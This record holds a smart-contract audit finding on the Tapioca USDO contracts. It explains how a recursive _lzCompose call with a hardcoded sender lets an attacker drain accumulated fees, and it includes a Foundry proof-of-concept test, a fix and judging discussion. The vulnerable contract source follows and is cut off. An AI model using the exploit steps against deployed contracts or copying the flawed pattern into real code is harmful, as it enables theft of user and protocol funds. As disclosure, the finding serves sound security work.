{
  "Title": "H-11: Recursive _lzCompose() call can be leveraged to steal all generated USDO fees",
  "Content": "# Issue H-11: Recursive _lzCompose() call can be leveraged to steal all generated USDO fees \n\nSource: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/113 \n\n## Found by \n0xadrii, ComposableSecurity\n## Summary\n\nIt is possible to steal all generated USDO fees by leveraging the recursive _lzCompose() call triggered in compose calls.\n\n## Vulnerability Detail\n\nThe `USDOFlashloanHelper` contract allows users to take USDO flash loans. When a user takes a flash loan some fees will be enforced and transferred to the USDO contract:\n\n```solidity\n// USDOFlashloanHelper.sol\nfunction flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)\n        external\n        override\n        returns (bool)\n    {\n\t\t\t\n        ...\n\n        IERC20(address(usdo)).safeTransferFrom(address(receiver), address(usdo), fee);\n \n        _flashloanEntered = false;\n\n        return true;\n    }\n```\n\nSuch fees can be later retrieved by the owner of the USDO contract via the `extractFees()` function:\n\n```solidity\n// Usdo.sol\nfunction extractFees() external onlyOwner { \n        if (_fees > 0) {\n            uint256 balance = balanceOf(address(this));\n\n            uint256 toExtract = balance >= _fees ? _fees : balance;\n            _fees -= toExtract;\n            _transfer(address(this), msg.sender, toExtract);\n        }\n    }\n```\n\nHowever, such fees can be stolen by an attacker by leveraging a wrong parameter set when performing a compose call.\n\nWhen a compose call is triggered, the internal `_lzCompose()` call will be triggered. This call will check the `msgType_` and execute some logic according to the type of message requested. After executing the corresponding logic, it will be checked if there is an additional message by checking the `nextMsg_.length`. If the compose call had a next message to be called, a recursive call will be triggered and `_lzCompose()` will be called again:\n\n```solidity\n// TapiocaOmnichainReceiver.sol\n\nfunction _lzCompose(address srcChainSender_, bytes32 _guid, bytes memory oftComposeMsg_) internal {\n \n        // Decode OFT compose message.\n        (uint16 msgType_,,, bytes memory tapComposeMsg_, bytes memory nextMsg_) =\n            TapiocaOmnichainEngineCodec.decodeToeComposeMsg(oftComposeMsg_);\n\n        // Call Permits/approvals if the msg type is a permit/approval.\n        // If the msg type is not a permit/approval, it will call the other receivers. \n        if (msgType_ == MSG_REMOTE_TRANSFER) {   \n            _remoteTransferReceiver(srcChainSender_, tapComposeMsg_);   \n        } else if (!_extExec(msgType_, tapComposeMsg_)) { \n            // Check if the TOE extender is set and the msg type is valid. If so, call the TOE extender to handle msg.\n            if ( \n                address(tapiocaOmnichainReceiveExtender) != address(0)\n                    && tapiocaOmnichainReceiveExtender.isMsgTypeValid(msgType_)\n            ) {  \n                bytes memory callData = abi.encodeWithSelector(\n                    ITapiocaOmnichainReceiveExtender.toeComposeReceiver.selector,\n                    msgType_,\n                    srcChainSender_, \n                    tapComposeMsg_\n                ); \n                (bool success, bytes memory returnData) =\n                    address(tapiocaOmnichainReceiveExtender).delegatecall(callData);\n                if (!success) {\n                    revert(_getTOEExtenderRevertMsg(returnData));\n                }\n            } else {\n                // If no TOE extender is set or msg type doesn't match extender, try to call the internal receiver.\n                if (!_toeComposeReceiver(msgType_, srcChainSender_, tapComposeMsg_)) {\n                    revert InvalidMsgType(msgType_);\n                }\n            }\n        }\n   \n        emit ComposeReceived(msgType_, _guid, tapComposeMsg_);\n        if (nextMsg_.length > 0) {\n            _lzCompose(address(this), _guid, nextMsg_);\n        }\n    }\n\n```\n\nAs we can see in the code snippet’s last line, if `nextMsg_.length > 0` an additional compose call can be triggered . The problem with this call is that the first parameter in the  `_lzCompose()` call is hardcoded to be `address(this)` (address of USDO), making the `srcChainSender_` become the USDO address in the recursive compose call.\n\nAn attacker can then leverage the remote transfer logic in order to steal all the USDO tokens held in the USDO contract (mainly fees generated by flash loans).\n\nForcing the recursive call to be a remote transfer, `_remoteTransferReceiver()` will be called. Because the source chain sender in the recursive call is the USDO contract, the `owner` parameter in the remote transfer (the address from which the remote transfer tokens are burnt) can also be set to the USDO address, making the allowance check in the `_internalTransferWithAllowance()` call be bypassed, and effectively burning a desired amount from USDO.\n\n```solidity\n// USDO.sol\nfunction _remoteTransferReceiver(address _srcChainSender, bytes memory _data) internal virtual {\n        RemoteTransferMsg memory remoteTransferMsg_ = TapiocaOmnichainEngineCodec.decodeRemoteTransferMsg(_data);\n\n        \n        /// @dev xChain owner needs to have approved dst srcChain `sendPacket()` msg.sender in a previous composedMsg. Or be the same address.\n        _internalTransferWithAllowance(\n            remoteTransferMsg_.owner, _srcChainSender, remoteTransferMsg_.lzSendParam.sendParam.amountLD\n        );   \n          \n        ...\n    }\n\nfunction _internalTransferWithAllowance(address _owner, address srcChainSender, uint256 _amount) internal {\n        \n        if (_owner != srcChainSender) {   // <------- `_owner` and `srcChainSender` will both be the USDO address, so the check in `_spendAllowance()` won't be performed\n            _spendAllowance(_owner, srcChainSender, _amount);\n        }\n    \n        _transfer(_owner, address(this), _amount);\n    } \n```\n\nAfter burning the tokens from USDO, the remote transfer will trigger a call to a destination chain to mint the burnt tokens in the origin chain. The receiver of the tokens can be different from the address whose tokens were burnt, so an attacker can obtain the minted tokens in the destination chain, effectively stealing all USDO balance from the USDO contract.\n\nAn example attack path would be:\n\n1. An attacker creates a compose call from chain A to chain B. This compose call is actually composed of two messages:\n    1. The first message, which won’t affect the attack and is simply the initial step to trigger the attack in the destination chain\n    2. The second message (`nextMsg`), which is the actual compose message that will trigger the remote transfer and burn the tokens in chain B, and finally trigger a call back to chain A to mint he tokens\n2. The call is executed, chain B receives the call and triggers the first compose message (as demonstrated in the PoC, this first message is not important and can simply be a remote transfer call with a 0 amount of tokens). After triggering the first compose call, the second compose message is triggered. The USDO contract is set as the source chain sender and the remote transfer is called. Because the owner set in the compose call and the source chain sender are the same, the specified tokens in the remote transfer are directly burnt \n3. Finally, the compose call triggers a call back to chain A to mint the burnt tokens in chain B, and tokens are minted to the attacker\n\n![attack_tapioca](https://github.com/sherlock-audit/2024-02-tapioca-0xadrii/assets/56537955/040b7b28-7eae-4948-b909-9d15ad5833d0)\n\n## Proof of concept\n\nThe following proof of concept illustrates how the mentioned attack can take place. In order to execute the PoC, the following steps must be performed:\n\n1. Create an `EnpointMock.sol` file inside the `test` folder inside `Tapioca-bar` and paste the following code (the current tests are too complex, this imitates LZ’s endpoint contracts and reduces the poc’s complexity):\n\n```solidity\n// SPDX-License-Identifier: LZBL-1.2\n\npragma solidity ^0.8.20;\n\nstruct MessagingReceipt {\n    bytes32 guid;\n    uint64 nonce;\n    MessagingFee fee;\n}\n\nstruct MessagingParams {\n    uint32 dstEid;\n    bytes32 receiver;\n    bytes message;\n    bytes options; \n    bool payInLzToken;\n}\n\nstruct MessagingFee {\n    uint256 nativeFee;\n    uint256 lzTokenFee;\n}\ncontract MockEndpointV2  {\n\n  \n    function send(\n        MessagingParams calldata _params,\n        address _refundAddress\n    ) external payable  returns (MessagingReceipt memory receipt) {\n        // DO NOTHING\n    }\n\n    /// @dev the Oapp sends the lzCompose message to the endpoint\n    /// @dev the composer MUST assert the sender because anyone can send compose msg with this function\n    /// @dev with the same GUID, the Oapp can send compose to multiple _composer at the same time\n    /// @dev authenticated by the msg.sender\n    /// @param _to the address which will receive the composed message\n    /// @param _guid the message guid\n    /// @param _message the message\n    function sendCompose(address _to, bytes32 _guid, uint16 _index, bytes calldata _message) external {\n         // DO NOTHING\n        \n    }\n  \n}\n\n```\n\n1. Import and deploy two mock endpoints in the `Usdo.t.sol` file\n2. Change the inherited OApp in `Usdo.sol` ’s implementation so that the endpoint variable is not immutable and add a `setEndpoint()` function so that the endpoint configured in `setUp()` can be chainged to the newly deployed endpoints\n3. Paste the following test insde `Usdo.t.sol` :\n\n```solidity\nfunction testVuln_USDOBorrowFeesCanBeDrained() public {\n\n        // Change configured enpoints\n\n        endpoints[aEid] = address(mockEndpointV2A);\n        endpoints[bEid] = address(mockEndpointV2B);\n\n        aUsdo.setEndpoint(address(mockEndpointV2A));\n        bUsdo.setEndpoint(address(mockEndpointV2B));\n\n        \n        // Mock generated fees\n        deal(address(bUsdo), address(bUsdo), 100 ether);\n\n        ////////////////////////////////////////////////////////\n        //                 PREPARE MESSAGES                   //\n        ////////////////////////////////////////////////////////\n\n        // NEXT MESSAGE    B --> A      (EXECUTED AS THE nextMsg after the INITIAL  B --> A MESSAGE)            \n\n        SendParam memory sendParamAToBVictim = SendParam({\n            dstEid: aEid,\n            to: OFTMsgCodec.addressToBytes32(makeAddr(\"attacker\")),\n            amountLD: 100 ether, // IMPORTANT: This must be set to the amount we want to steal\n            minAmountLD: 100 ether,\n            extraOptions: bytes(\"\"),\n            composeMsg: bytes(\"\"),\n            oftCmd: bytes(\"\")\n        });  \n        MessagingFee memory feeAToBVictim = MessagingFee({\n            nativeFee: 0,\n            lzTokenFee: 0\n        });\n        \n        LZSendParam memory lzSendParamAToBVictim = LZSendParam({\n            sendParam: sendParamAToBVictim,\n            fee: feeAToBVictim,\n            extraOptions: bytes(\"\"),\n            refundAddress: makeAddr(\"attacker\")\n        });\n\n        RemoteTransferMsg memory remoteTransferMsgVictim = RemoteTransferMsg({\n            owner: address(bUsdo), // IMPORTANT: This will make the attack be triggered as bUsdo will become the srcChainSender in the nextMsg compose call\n            composeMsg: bytes(\"\"),\n            lzSendParam: lzSendParamAToBVictim\n        });\n\n        uint16 index; // needed to bypass Solidity's encoding literal error\n        // Create Toe Compose message for the victim\n        bytes memory toeComposeMsgVictim = abi.encodePacked(\n            PT_REMOTE_TRANSFER, // msgType\n            uint16(abi.encode(remoteTransferMsgVictim).length), // message length (0)\n            index, // index\n            abi.encode(remoteTransferMsgVictim), // message\n            bytes(\"\") // next message\n        );\n \n        // SECOND MESSAGE (composed)     B ---> A      \n        // This second message is a necessary step in order to reach the execution\n        // inside `_lzCompose()` where the nextMsg can be triggered\n\n        SendParam memory sendParamBToA = SendParam({\n            dstEid: aEid,\n            to: OFTMsgCodec.addressToBytes32(address(aUsdo)),\n            amountLD: 0, \n            minAmountLD: 0,\n            extraOptions: bytes(\"\"),\n            composeMsg: bytes(\"\"),\n            oftCmd: bytes(\"\")\n        });  \n        MessagingFee memory feeBToA = MessagingFee({\n            nativeFee: 0,\n            lzTokenFee: 0\n        });\n        \n        LZSendParam memory lzSendParamBToA = LZSendParam({\n            sendParam: sendParamBToA,\n            fee: feeBToA,\n            extraOptions: bytes(\"\"),\n            refundAddress: makeAddr(\"attacker\")\n        });\n\n        // Create remote transfer message\n        RemoteTransferMsg memory remoteTransferMsg = RemoteTransferMsg({\n            owner: makeAddr(\"attacker\"),\n            composeMsg: bytes(\"\"),\n            lzSendParam: lzSendParamBToA\n        });\n\n        // Create Toe Compose message\n        bytes memory toeComposeMsg = abi.encodePacked(\n            PT_REMOTE_TRANSFER, // msgType\n            uint16(abi.encode(remoteTransferMsg).length), // message length\n            index, // index\n            abi.encode(remoteTransferMsg),\n            toeComposeMsgVictim // next message: IMPORTANT to set this to the A --> B message that will be triggered as the `nextMsg`\n        );\n         \n        // INITIAL MESSAGE       A ---> B                      \n\n        // Create `_lzSendParam` parameter for `sendPacket()`\n        SendParam memory sendParamAToB = SendParam({\n            dstEid: bEid,\n            to: OFTMsgCodec.addressToBytes32(makeAddr(\"attacker\")), // address here doesn't matter\n            amountLD: 0,\n            minAmountLD: 0,\n            extraOptions: bytes(\"\"),\n            composeMsg: bytes(\"\"),\n            oftCmd: bytes(\"\")\n        });  \n        MessagingFee memory feeAToB = MessagingFee({\n            nativeFee: 0,\n            lzTokenFee: 0\n        });\n        \n        LZSendParam memory lzSendParamAToB = LZSendParam({\n            sendParam: sendParamAToB,\n            fee: feeAToB,\n            extraOptions: bytes(\"\"),\n            refundAddress: makeAddr(\"attacker\")\n        });\n\n        vm.startPrank(makeAddr(\"attacker\"));\n        aUsdo.sendPacket(lzSendParamAToB, toeComposeMsg);\n\n        // EXECUTE ATTACK\n\n        // Execute first lzReceive() --> receive message in chain B\n    \n        vm.startPrank(endpoints[bEid]);\n        UsdoReceiver(address(bUsdo)).lzReceive(\n            Origin({sender: OFTMsgCodec.addressToBytes32(address(aUsdo)), srcEid: aEid, nonce: 0}), \n            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)\n            abi.encodePacked( // same as _buildOFTMsgAndOptions()\n                sendParamAToB.to,\n                 index,  // amount (use an initialized 0 variable due to Solidity restrictions)\n                OFTMsgCodec.addressToBytes32(makeAddr(\"attacker\")), // initially, the sender for the first A --> B message is the attacker\n                toeComposeMsg\n            ), // message\n            address(0), // executor (not used)\n            bytes(\"\") // extra data (not used)\n        );\n\n        // Compose message is sent in `lzReceive()`, we need to trigger `lzCompose()`.\n        // bUsdo will be burnt from the bUSDO address, and nextMsg will be triggered to mint the burnt amount in chain A, having \n        // the attacker as the receiver\n        UsdoReceiver(address(bUsdo)).lzCompose(\n            address(bUsdo), \n            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)\n            abi.encodePacked(OFTMsgCodec.addressToBytes32(address(aUsdo)), toeComposeMsg), // message\n            address(0), // executor (not used)\n            bytes(\"\") // extra data (not used)\n        );\n\n        vm.startPrank(endpoints[aEid]);\n\n        // Receive nextMsg in chain A, mint tokens to the attacker\n        uint64 tokenAmountSD = usdoHelper.toSD(100 ether, aUsdo.decimalConversionRate());\n\n        UsdoReceiver(address(aUsdo)).lzReceive(\n            Origin({sender: OFTMsgCodec.addressToBytes32(address(bUsdo)), srcEid: bEid, nonce: 0}), \n            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)\n            abi.encodePacked( // same as _buildOFTMsgAndOptions()\n                OFTMsgCodec.addressToBytes32(makeAddr(\"attacker\")),\n                tokenAmountSD\n            ), // message\n            address(0), // executor (not used)\n            bytes(\"\") // extra data (not used)\n        );\n        \n\n        // Finished: bUSDO fees get drained, attacker obtains all the fees in the form of aUSDO\n        assertEq(bUsdo.balanceOf(address(bUsdo)), 0);\n        assertEq(aUsdo.balanceOf(makeAddr(\"attacker\")), 100 ether);\n          \n    }\n```\n\nRun the poc with the following command: `forge test --mt testVuln_USDOBorrowFeesCanBeDrained`\n\nThe proof of concept shows how in the end, USDO’s `bUsdo` balance will become 0, while the same amount of`aUsdo` in chain A will be minted to the attacker.\n\n## Impact\n\nHigh, all fees generated by the USDO contract can be effectively stolen by the attacker\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/gitmodule/tapioca-periph/contracts/tapiocaOmnichainEngine/TapiocaOmnichainReceiver.sol#L182\n\n## Tool used\n\nManual Review, foundry\n\n## Recommendation\n\nEnsure that the `_lzCompose()` call triggered when a `_nextMsg` exists keeps a consistent source chain sender address, instead of hardcoding it to `address(this)` :\n\n```diff\n// TapiocaOmnichainReceiver.sol\n\nfunction _lzCompose(address srcChainSender_, bytes32 _guid, bytes memory oftComposeMsg_) internal {\n \n        // Decode OFT compose message.\n        (uint16 msgType_,,, bytes memory tapComposeMsg_, bytes memory nextMsg_) =\n            TapiocaOmnichainEngineCodec.decodeToeComposeMsg(oftComposeMsg_);\n\n        ...\n   \n        emit ComposeReceived(msgType_, _guid, tapComposeMsg_);\n        if (nextMsg_.length > 0) {\n-            _lzCompose(address(this), _guid, nextMsg_);‚\n+            _lzCompose(srcChainSender_, _guid, nextMsg_);\n        }\n    }\n```\n\n\n\n## Discussion\n\n**0xRektora**\n\nDupe of https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/111\n\n**0xadrii**\n\nEscalate\nI believe this issue has been wrongly marked as a duplicate of #111 . \n\nThe vulnerability detailed in this issue is not related to the issue of passing a wrong parameter as the source chain sender when the `_internalRemoteTransferSendPacket()` function is called. The overall root cause for the vulnerability described in #111 is actually different from the issue described in this report.\n\nThe problem with the vulnerability reported in this issue is that `address(this)` is hardcoded as the source chain sender for the next compose call if the length of the next message appended is > 0:\n\n```solidity\n// TapiocaOmnichainReceiver.sol\n\n...\nif (nextMsg_.length > 0) { \n            _lzCompose(address(this), _guid, nextMsg_); // <---- `address(this)` is wrong\n}\n```\n\nThis will make the next compose call have `address(this)` (the USDO contract address) as the source chain sender for the next call.  As seen in [this issue comment](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/111#issuecomment-2020483418), the fix proposed for #111 changes the source chain sender [from `remoteTransferMsg_.owner` to `_srcChainSender`](https://github.com/Tapioca-DAO/tapioca-periph/pull/200/commits/932c6a2e2237f47b591e334511ccd82609a89f5c). \n\nAlthough this fix mitigates the possibility of draining any account that is passed as the `remoteTransferMsg_.owner` parameter (which is the root cause that allows #111 and all its duplicates to take place), the issue described in this report is still possible because the USDO contract will be passed as the `srcChainSender` in the compose call, which enables malicious actors to execute remote transfers as if they were USDO. \n\nAs shown in my PoC, an attacker can then burn all USDO fees held in the USDO contract on chain B, and transfer them to an arbitrary address in chain A, effectively stealing all fees sitting in the USDO contract.\n\n**sherlock-admin2**\n\n> Escalate\n> I believe this issue has been wrongly marked as a duplicate of #111 . \n> \n> The vulnerability detailed in this issue is not related to the issue of passing a wrong parameter as the source chain sender when the `_internalRemoteTransferSendPacket()` function is called. The overall root cause for the vulnerability described in #111 is actually different from the issue described in this report.\n> \n> The problem with the vulnerability reported in this issue is that `address(this)` is hardcoded as the source chain sender for the next compose call if the length of the next message appended is > 0:\n> \n> ```solidity\n> // TapiocaOmnichainReceiver.sol\n> \n> ...\n> if (nextMsg_.length > 0) { \n>             _lzCompose(address(this), _guid, nextMsg_); // <---- `address(this)` is wrong\n> }\n> ```\n> \n> This will make the next compose call have `address(this)` (the USDO contract address) as the source chain sender for the next call.  As seen in [this issue comment](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/111#issuecomment-2020483418), the fix proposed for #111 changes the source chain sender [from `remoteTransferMsg_.owner` to `_srcChainSender`](https://github.com/Tapioca-DAO/tapioca-periph/pull/200/commits/932c6a2e2237f47b591e334511ccd82609a89f5c). \n> \n> Although this fix mitigates the possibility of draining any account that is passed as the `remoteTransferMsg_.owner` parameter (which is the root cause that allows #111 and all its duplicates to take place), the issue described in this report is still possible because the USDO contract will be passed as the `srcChainSender` in the compose call, which enables malicious actors to execute remote transfers as if they were USDO. \n> \n> As shown in my PoC, an attacker can then burn all USDO fees held in the USDO contract on chain B, and transfer them to an arbitrary address in chain A, effectively stealing all fees sitting in the USDO contract.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**nevillehuang**\n\nThis seems like a duplicate of #135, will need to review further. They are all very similar to each other.\n\n**cvetanovv**\n\nI agree with the escalations and @nevillehuang comment. We can **deduplicate** from #111 and **duplicate** with #135.\n\n**cvetanovv**\n\nPlanning to accept the escalation and remove the duplication with #111, but duplicate with #135.\n\n**Evert0x**\n\nResult:\nHigh\nHas Duplicates\n\n**sherlock-admin3**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [0xadrii](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/113/#issuecomment-2028930900): accepted\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/170",
  "Code": [
    {
      "filename": "Tapioca-bar/gitmodule/tapioca-periph/contracts/tapiocaOmnichainEngine/TapiocaOmnichainReceiver.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.22;\n\n// LZ\nimport {\n    MessagingReceipt, OFTReceipt, SendParam\n} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oft/interfaces/IOFT.sol\";\nimport {IOAppMsgInspector} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/interfaces/IOAppMsgInspector.sol\";\nimport {IOAppComposer} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/interfaces/IOAppComposer.sol\";\nimport {OFTMsgCodec} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oft/libs/OFTMsgCodec.sol\";\nimport {Origin} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/OApp.sol\";\nimport {OFT} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oft/OFT.sol\";\n\n// Tapioca\nimport {\n    ITapiocaOmnichainReceiveExtender,\n    ERC721PermitApprovalMsg,\n    ERC20PermitApprovalMsg,\n    RemoteTransferMsg,\n    LZSendParam\n} from \"tapioca-periph/interfaces/periph/ITapiocaOmnichainEngine.sol\";\nimport {TapiocaOmnichainEngineCodec} from \"./TapiocaOmnichainEngineCodec.sol\";\nimport {BaseTapiocaOmnichainEngine} from \"./BaseTapiocaOmnichainEngine.sol\";\n\n/*\n\n████████╗ █████╗ ██████╗ ██╗ ██████╗  ██████╗ █████╗ \n╚══██╔══╝██╔══██╗██╔══██╗██║██╔═══██╗██╔════╝██╔══██╗\n   ██║   ███████║██████╔╝██║██║   ██║██║     ███████║\n   ██║   ██╔══██║██╔═══╝ ██║██║   ██║██║     ██╔══██║\n   ██║   ██║  ██║██║     ██║╚██████╔╝╚██████╗██║  ██║\n   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n   \n*/\n\nabstract contract TapiocaOmnichainReceiver is BaseTapiocaOmnichainEngine, IOAppComposer {\n    using OFTMsgCodec for bytes;\n    using OFTMsgCodec for bytes32;\n\n    /**\n     *  @dev Triggered if the address of the composer doesn't match current contract in `lzCompose`.\n     * Compose caller and receiver are the same address, which is this.\n     */\n    error InvalidComposer(address composer);\n    error InvalidCaller(address caller); // Should be the endpoint address\n    error InvalidMsgType(uint16 msgType); // Triggered if the msgType is invalid on an `_lzCompose`.\n\n    /// @dev Compose received.\n    event ComposeReceived(uint16 indexed msgType, bytes32 indexed guid, bytes composeMsg);\n    /// @dev twTAP unlock operation received.\n    event RemoteTransferReceived(address indexed owner, uint256 indexed dstEid, address indexed to, uint256 amount);\n\n    /**\n     * @dev !!! FIRST ENTRYPOINT, COMPOSE MSG ARE TO BE BUILT HERE  !!!\n     *\n     * @dev Slightly modified version of the OFT _lzReceive() operation.\n     * The composed message is sent to `address(this)` instead of `toAddress`.\n     * @dev Internal function to handle the receive on the LayerZero endpoint.\n     * @dev Caller is verified on the public function. See `OAppReceiver.lzReceive()`.\n     *\n     * @param _origin The origin information.\n     *  - srcEid: The source chain endpoint ID.\n     *  - sender: The sender address from the src chain.\n     *  - nonce: The nonce of the LayerZero message.\n     * @param _guid The unique identifier for the received LayerZero message.\n     * @param _message The encoded message.\n     * _executor The address of the executor.\n     * _extraData Additional data.\n     */\n    // TODO check if OApp sender is sanitized?\n    // TODO !!!!!!!!! Perform ld2sd conversion on the compose messages amounts.\n    function _lzReceive(\n        Origin calldata _origin,\n        bytes32 _guid,\n        bytes calldata _message,\n        address, /*_executor*/ // @dev unused in the default implementation.\n        bytes calldata /*_extraData*/ // @dev unused in the default implementation.\n    ) internal virtual override {\n        // @dev The src sending chain doesn't know the address length on this chain (potentially non-evm)\n        // Thus everything is bytes32() encoded in flight.\n        address toAddress = _message.sendTo().bytes32ToAddress();\n        // @dev Convert the amount to credit into local decimals.\n        uint256 amountToCreditLD = _toLD(_message.amountSD());\n        // @dev Credit the amount to the recipient and return the ACTUAL amount the recipient received in local decimals\n        uint256 amountReceivedLD = _credit(toAddress, amountToCreditLD, _origin.srcEid);\n\n        if (_message.isComposed()) {\n            // @dev Stores the lzCompose payload that will be executed in a separate tx.\n            // Standardizes functionality for executing arbitrary contract invocation on some non-evm chains.\n            // @dev The off-chain executor will listen and process the msg based on the src-chain-callers compose options passed.\n            // @dev The index is used when a OApp needs to compose multiple msgs on lzReceive.\n            // For default OFT implementation there is only 1 compose msg per lzReceive, thus its always 0.\n            endpoint.sendCompose(\n                address(this), // Updated from default `toAddress`\n                _guid,\n                0, /* the index of the composed message*/\n                _message.composeMsg()\n            );\n        }\n\n        emit OFTReceived(_guid, _origin.srcEid, toAddress, amountReceivedLD);\n    }\n\n    // TODO - SANITIZE MSG TYPE\n    /**\n     * @dev !!! SECOND ENTRYPOINT, CALLER NEEDS TO BE VERIFIED !!!\n     *\n     * @notice Composes a LayerZero message from an OApp.\n     * @dev The message comes in form:\n     *      - [composeSender::address][oftComposeMsg::bytes]\n     *                                          |\n     *                                          |\n     *                        [msgType::uint16, composeMsg::bytes]\n     * @dev The composeSender is the user that initiated the `sendPacket()` call on the srcChain.\n     *\n     * @param _from The address initiating the composition, typically the OApp where the lzReceive was called.\n     * @param _guid The unique identifier for the corresponding LayerZero src/dst tx.\n     * @param _message The composed message payload in bytes. NOT necessarily the same payload passed via lzReceive.\n     */\n    function lzCompose(\n        address _from,\n        bytes32 _guid,\n        bytes calldata _message,\n        address, //executor\n        bytes calldata //extra Data\n    ) external payable override {\n        // Validate the from and the caller.\n        if (_from != address(this)) {\n            revert InvalidComposer(_from);\n        }\n        if (msg.sender != address(endpoint)) {\n            revert InvalidCaller(msg.sender);\n        }\n\n        // Decode LZ compose message.\n        (address srcChainSender_, bytes memory oftComposeMsg_) =\n            TapiocaOmnichainEngineCodec.decodeLzComposeMsg(_message);\n        // Execute the composed message.\n        _lzCompose(srcChainSender_, _guid, oftComposeMsg_);\n    }\n\n    /**\n     * @dev Modifier behavior of composed calls to be executed as a single Tx.\n     * Since composed msgs and approval\n     */\n    function _lzCompose(address srcChainSender_, bytes32 _guid, bytes memory oftComposeMsg_) internal {\n        // Decode OFT compose message.\n        (uint16 msgType_,,, bytes memory tapComposeMsg_, bytes memory nextMsg_) =\n            TapiocaOmnichainEngineCodec.decodeToeComposeMsg(oftComposeMsg_);\n\n        // Call Permits/approvals if the msg type is a permit/approval.\n        // If the msg type is not a permit/approval, it will call the other receivers.\n        if (msgType_ == MSG_REMOTE_TRANSFER) {\n            _remoteTransferReceiver(srcChainSender_, tapComposeMsg_);\n        } else if (!_extExec(msgType_, tapComposeMsg_)) {\n            // Check if the TOE extender is set and the msg type is valid. If so, call the TOE extender to handle msg.\n            if (\n                address(tapiocaOmnichainReceiveExtender) != address(0)\n                    && tapiocaOmnichainReceiveExtender.isMsgTypeValid(msgType_)\n            ) {\n                bytes memory callData = abi.encodeWithSelector(\n                    ITapiocaOmnichainReceiveExtender.toeComposeReceiver.selector,\n                    msgType_,\n                    srcChainSender_,\n                    tapComposeMsg_\n                );\n                (bool success, bytes memory returnData) =\n                    address(tapiocaOmnichainReceiveExtender).delegatecall(callData);\n                if (!success) {\n                    revert(_getTOEExtenderRevertMsg(returnData));\n                }\n            } else {\n                // If no TOE extender is set or msg type doesn't match extender, try to call the internal receiver.\n                if (!_toeComposeReceiver(msgType_, srcChainSender_, tapComposeMsg_)) {\n                    revert InvalidMsgType(msgType_);\n                }\n            }\n        }\n\n        emit ComposeReceived(msgType_, _guid, tapComposeMsg_);\n        if (nextMsg_.length > 0) {\n            _lzCompose(address(this), _guid, nextMsg_);\n        }\n    }\n\n    // ********************* //\n    // ***** RECEIVERS ***** //\n    // ********************* //\n\n    /**\n     * @dev Meant to be override by TOE contracts, such as tOFT or TapToken, to handle their own msg types.\n     *\n     * @param _msgType is the msgType of the composed message. See `TapiocaOmnichainEngineCodec.decodeToeComposeMsg()`.\n     * See `BaseTapiocaOmnichainEngine` to see the default TOE messages types.\n     * @param _srcChainSender The address of the sender on the source chain.\n     * @param _toeComposeMsg is the composed message payload, of whatever the _msgType handler is expecting.\n     * @return success is the success of the composed message handler. If no handler is found, it should return false to trigger `InvalidMsgType()`.\n     */\n    function _toeComposeReceiver(uint16 _msgType, address _srcChainSender, bytes memory _toeComposeMsg)\n        internal\n        virtual\n        returns (bool success)\n    {}\n\n    /**\n     * // TODO Check if it's safe to send composed messages too.\n     * // TODO Write test for composed messages call. A->B->A-B/C?\n     * @dev Transfers tokens AND composed messages from this contract to the recipient on the chain A. Flow of calls is: A->B->A.\n     * @dev The user needs to have approved the TapToken contract to spend the TAP.\n     *\n     * @param _srcChainSender The address of the sender on the source chain.\n     * @param _data The call data containing info about the transfer (LZSendParam).\n     */\n    function _remoteTransferReceiver(address _srcChainSender, bytes memory _data) internal virtual {\n        RemoteTransferMsg memory remoteTransferMsg_ = TapiocaOmnichainEngineCodec.decodeRemoteTransferMsg(_data);\n\n        /// @dev xChain owner needs to have approved dst srcChain `sendPacket()` msg.sender in a previous composedMsg. Or be the same address.\n        _internalTransferWithAllowance(\n            remoteTransferMsg_.owner, _srcChainSender, remoteTransferMsg_.lzSendParam.sendParam.amountLD\n        );\n\n        // Make the internal transfer, burn the tokens from this contract and send them to the recipient on the other chain.\n        _internalRemoteTransferSendPacket(\n            remoteTransferMsg_.owner, remoteTransferMsg_.lzSendParam, remoteTransferMsg_.composeMsg\n        );\n\n        emit RemoteTransferReceived(\n            remoteTransferMsg_.owner,\n            remoteTransferMsg_.lzSendParam.sendParam.dstEid,\n            OFTMsgCodec.bytes32ToAddress(remoteTransferMsg_.lzSendParam.sendParam.to),\n            remoteTransferMsg_.lzSendParam.sendParam.amountLD\n        );\n    }\n\n    /**\n     * // TODO review this function.\n     *\n     * @dev Slightly modified version of the OFT _sendPacket() operation. To accommodate the `srcChainSender` parameter and potential dust.\n     * @dev !!! IMPORTANT !!! made ONLY for the `_remoteTransferReceiver()` operation.\n     */\n    function _internalRemoteTransferSendPacket(\n        address _srcChainSender,\n        LZSendParam memory _lzSendParam,\n        bytes memory _composeMsg\n    ) internal returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt) {\n        // Burn tokens from this contract\n        (uint256 amountDebitedLD_, uint256 amountToCreditLD_) = _debitView(\n            _lzSendParam.sendParam.amountLD, _lzSendParam.sendParam.minAmountLD, _lzSendParam.sendParam.dstEid\n        );\n        _burn(address(this), amountToCreditLD_);\n\n        _lzSendParam.sendParam.amountLD = amountToCreditLD_;\n        _lzSendParam.sendParam.minAmountLD = amountToCreditLD_;\n\n        // If the srcChain amount request is bigger than the debited one, overwrite the 